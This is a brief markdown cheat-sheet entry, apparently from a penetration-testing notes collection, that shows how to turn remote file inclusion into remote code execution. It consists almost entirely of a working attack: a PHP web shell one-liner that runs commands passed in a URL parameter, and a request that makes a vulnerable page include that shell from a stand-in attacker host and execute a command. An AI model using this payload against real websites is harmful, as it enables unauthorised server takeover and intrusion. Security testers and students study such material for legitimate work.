# RFI

### RFI to RCE
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```
www.website.com/abc.php?url=//attacker.com/share/shell.php&cmd=id
```


